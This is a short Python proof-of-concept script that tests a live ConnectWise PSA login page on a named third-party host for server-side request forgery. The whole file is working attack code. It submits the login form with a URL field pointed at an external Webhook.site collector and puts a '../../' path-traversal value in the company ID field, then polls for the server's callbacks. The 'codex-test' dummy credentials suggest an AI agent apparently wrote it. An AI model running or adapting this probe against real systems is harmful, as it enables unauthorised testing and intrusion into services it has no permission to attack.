#!/usr/bin/env python3
"""Verify ConnectWise PSA login SSRF with a self-owned Webhook.site collector.

Requires: pip install requests
Only dummy integration credentials are sent. No tenant is created or modified.
"""

import re
import sys
import time
import uuid

import requests


TARGET = "https://cwpsa.rmm.bitdefender.com/login"
WEBHOOK_API = "https://webhook.site"


def create_collector(session: requests.Session) -> str:
    response = session.post(
        f"{WEBHOOK_API}/token",
        json={
            "default_status": 200,
            "default_content": "{}",
            "default_content_type": "application/json",
        },
        timeout=15,
    )
    response.raise_for_status()
    return response.json()["uuid"]


def get_login_token(session: requests.Session) -> str:
    response = session.get(TARGET, timeout=15)
    response.raise_for_status()
    match = re.search(
        r'<input[^>]*name="__RequestVerificationToken"[^>]*value="([^"]+)"',
        response.text,
        re.IGNORECASE | re.DOTALL,
    )
    if not match:
        raise RuntimeError("The login form did not contain an anti-CSRF token")
    return match.group(1)


def submit_login(session: requests.Session, collector_url: str, marker: str) -> requests.Response:
    token = get_login_token(session)
    return session.post(
        TARGET,
        data={
            "SsoAlias": "",
            "ManageUrl": collector_url,
            "ManageCompanyId": marker,
            "ManagePublicKey": "codex-test",
            "ManagePrivateKey": "codex-test",
            "__RequestVerificationToken": token,
        },
        timeout=25,
        allow_redirects=False,
    )


def captured_requests(session: requests.Session, token: str) -> list[dict]:
    response = session.get(
        f"{WEBHOOK_API}/token/{token}/requests?sorting=newest",
        timeout=15,
    )
    response.raise_for_status()
    return response.json().get("data", [])


def main() -> int:
    session = requests.Session()
    collector_token = create_collector(session)
    host = f"{collector_token}.webhook.site"
    nonce = uuid.uuid4().hex[:12]
    direct_marker = f"direct-{nonce}"
    path_marker = f"path-{nonce}"
    probe_url = f"https://{host}"
    direct = submit_login(session, probe_url, direct_marker)
    print(f"Direct URL: HTTP {direct.status_code}")
    path = submit_login(session, probe_url, f"../../{path_marker}")
    print(f"Path test:  HTTP {path.status_code}")
    print(f"URL:        {probe_url}")

    for _ in range(10):
        hits = captured_requests(session, collector_token)
        direct_hits = [
            hit for hit in hits
            if hit.get("method") == "GET"
            and f"/login/companyinfo/{direct_marker}" in hit.get("url", "")
        ]
        path_hits = [
            hit for hit in hits
            if hit.get("method") == "GET"
            and f"/{path_marker}" in hit.get("url", "")
        ]
        if direct_hits and path_hits:
            print("Verified server-side callbacks:")
            for hit in (direct_hits[0], path_hits[0]):
                print(f"  {hit['method']} {hit['url']} from {hit.get('ip')}")
            return 0
        time.sleep(1.5)

    print("Expected callbacks were not observed within the polling window.", file=sys.stderr)
    return 1


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except (requests.RequestException, RuntimeError) as exc:
        print(f"PoC error: {exc}", file=sys.stderr)
        raise SystemExit(2)
